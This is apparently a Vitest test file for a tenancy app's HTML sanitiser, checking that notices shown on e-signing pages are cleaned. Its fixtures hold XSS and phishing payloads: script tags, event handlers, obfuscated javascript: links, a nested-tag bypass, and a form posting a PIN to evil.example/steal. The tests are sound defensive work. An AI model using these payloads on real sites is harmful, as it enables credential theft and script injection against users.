import { NOTICE_SIGNING_STATEMENT } from '@rent/domain/esign';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { NoticeReadOnly, SignScreen } from '../app/l/[token]/screens';
import type { SigningPage } from './links-api';
import { statementOf } from './notice';
import { sanitiseDocumentHtml } from './sanitize';

// M7 review round (LT 1 and 3): the frozen document's HTML is cleaned before the page shows it,
// and the statement above the signature box never goes missing.

const TOKEN = 's'.repeat(43);

describe('TL-07 and LN-04 the frozen document’s HTML on a signing page', () => {
  it('keeps what a document is made of', () => {
    const document =
      '<h1>Notice of entry</h1><p class="lead">We will inspect <strong>ACC-ELG-B1-05</strong> on 20 November 2026.</p>' +
      '<table><tr><th>Window</th><td>10:00 to 12:00</td></tr></table><ul><li>One</li></ul>' +
      '<p><a href="https://example.test/act-220">Act 220</a> <a href="mailto:office@example.test">office</a> <a href="#sign">sign</a> <a href="/l/x/document">PDF</a></p><br /><hr>';
    expect(sanitiseDocumentHtml(document)).toBe(
      document.replace('<br />', '<br />').replace('<hr>', '<hr>'),
    );
  });

  it('drops a refresh, a base, links to stylesheets, and forms and their fields, keeping the words', () => {
    const clean = sanitiseDocumentHtml(
      '<meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/">' +
        '<link rel="stylesheet" href="https://evil.example/x.css">' +
        '<form action="https://evil.example/steal" method="post"><label>Your PIN <input name="pin"></label><button>Send</button></form><p>Text</p>',
    );
    expect(clean).not.toMatch(/<meta|<base|<link|<form|<input|<button|evil\.example/i);
    expect(clean).toContain('Your PIN');
    expect(clean).toContain('<p>Text</p>');
  });

  it('drops scripts, styles, frames and plugins with their content, in any case', () => {
    const clean = sanitiseDocumentHtml(
      '<SCRIPT>alert(1)</SCRIPT><style>p{display:none}</style><iframe src="https://evil.example"></iframe>' +
        '<object data="x"></object><embed src="x"><svg><script>alert(2)</script></svg><noscript>n</noscript><p>Kept</p>',
    );
    expect(clean).toBe('<p>Kept</p>');
  });

  it('drops event handlers, inline styles and links that run code, however they are spelt', () => {
    const clean = sanitiseDocumentHtml(
      '<img src="x.png" onerror="alert(1)" style="position:fixed"><a href="javascript:alert(1)">a</a>' +
        '<a href=" JaVa\tScRiPt:alert(1)">b</a><a href="java&#x73;cript:alert(1)">c</a>' +
        '<a href="javascript&#x3a;alert(1)">d</a><a href="javascript&colon;alert(1)">e</a>' +
        '<a href="data:text/html,<script>alert(1)</script>">f</a><a href="vbscript:x">g</a>' +
        '<p ONCLICK="alert(1)" title="ok">p</p>',
    );
    expect(clean).not.toMatch(/onerror|onclick|style=|javascript|vbscript|data:/i);
    expect(clean).toContain('<img src="x.png">');
    expect(clean).toContain('<p title="ok">p</p>');
    for (const text of ['>a<', '>b<', '>c<', '>d<', '>e<', '>g<']) expect(clean).toContain(text);
  });

  it('leaves no tag rebuilt from the pieces of a removed one', () => {
    const clean = sanitiseDocumentHtml('<scr<script>x</script>ipt>alert(1)</script><p>ok</p>');
    expect(clean).not.toMatch(/<script/i);
    expect(clean).toContain('<p>ok</p>');
    expect(sanitiseDocumentHtml(null)).toBe('');
    expect(sanitiseDocumentHtml('<!-- a comment --><p>c</p>')).toBe('<p>c</p>');
  });

  it('the signing page and a read-only notice show the document cleaned', () => {
    const html =
      '<p>The notice</p><meta http-equiv="refresh" content="0;url=https://evil.example/">';
    const page = {
      screen: 'sign',
      reason: null,
      subject: 'notice',
      canDecline: false,
      notice: {
        number: 'N-000007',
        type: 'entry',
        typeLabel: 'Notice of entry',
        issuedAt: '2026-11-04T09:00:00.000Z',
        effectiveDate: null,
        statement: NOTICE_SIGNING_STATEMENT,
        supersededBy: null,
        acknowledgedByAnother: false,
      },
      purpose: 'sign',
      landlord: { name: 'Osu Ridge', contactName: null, phone: null, email: null },
      timeZone: 'Africa/Accra',
      linkExpiresAt: '2026-12-04T09:00:00.000Z',
      document: {
        title: 'Notice',
        reference: 'N-000007',
        sha256: 'a'.repeat(64),
        finalSha256: null,
        html,
        downloadable: true,
      },
      signer: {
        name: 'Abena',
        role: 'tenant',
        roleLabel: 'Tenant',
        status: 'pending',
        signedAt: null,
        declinedAt: null,
      },
      signers: [],
      code: {
        channel: 'sms',
        destinationMasked: '+233 24 *** **56',
        sentAt: null,
        expiresAt: null,
        attemptsLeft: 5,
        sendsLeft: 3,
        lockedUntil: null,
      },
      consent: { version: 'notice_ack.v1', text: 'I acknowledge receipt.' },
    } satisfies SigningPage;
    const signing = renderToStaticMarkup(
      createElement(SignScreen, { token: TOKEN, page, query: {} }),
    );
    expect(signing).toContain('<p>The notice</p>');
    expect(signing).not.toContain('<meta');
    const readOnly = renderToStaticMarkup(
      createElement(NoticeReadOnly, { token: TOKEN, page: { ...page, reason: 'notice_closed' } }),
    );
    expect(readOnly).toContain('<p>The notice</p>');
    expect(readOnly).not.toContain('<meta');

    // LT 1: with no statement from the API, the page says it in the domain's own words.
    const withoutStatement = { ...page, notice: { ...page.notice, statement: '  ' } };
    expect(statementOf(withoutStatement.notice)).toBe(NOTICE_SIGNING_STATEMENT);
    const text = renderToStaticMarkup(
      createElement(SignScreen, { token: TOKEN, page: withoutStatement, query: {} }),
    );
    expect(text).toContain(`<strong>${NOTICE_SIGNING_STATEMENT}</strong>`);
  });
});
